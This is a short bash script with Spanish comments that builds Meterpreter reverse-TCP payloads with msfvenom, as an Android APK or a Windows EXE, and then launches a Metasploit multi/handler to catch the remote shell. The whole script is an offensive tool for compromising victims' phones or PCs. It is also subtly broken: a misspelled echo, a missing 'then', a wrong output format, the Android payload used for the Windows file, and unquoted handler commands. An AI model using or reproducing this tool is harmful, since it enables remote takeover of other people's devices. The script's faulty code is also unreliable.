#!/bin/bash
i="0"
resize -s 27 80
clear
while [ $i -lt 1 ]
do
clear
ip=$(ip addr show wlan0 | awk '/inet / {print $2}' | cut -d/ -f 1)
echo -e '

(1) Android
(2) Windows

'

service postgresql start
exe='2'
apk='1'

read x

if [ "$x" == "$apk" ]; then   #alguien mira esto?
msfvenom -p android/meterpreter/reverse_tcp lhost=$ip lport=4444 -f exe > /root/sdcard/payload.apk
eho -e '

!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!Listo mirrey en /root/sdcard/payload.apk!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

preparando el handler..........

'

msfconsole -q -x  use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set lhost $ip ; set lport 4444 ; exploit ;

#necesito estabilidad emocional, efren siempre se mi amigo porfavor

elif [ "$x" == "$exe" ]; 
msfvenom -p android/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/sdcard/payload.exe
echo -e '

!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!listisimo guero en /root/sdcard/payload.exe!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

preparando las manitas..............

'

msfconsole -q -x  use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost$ip ; set lport 4444 ; exploit ;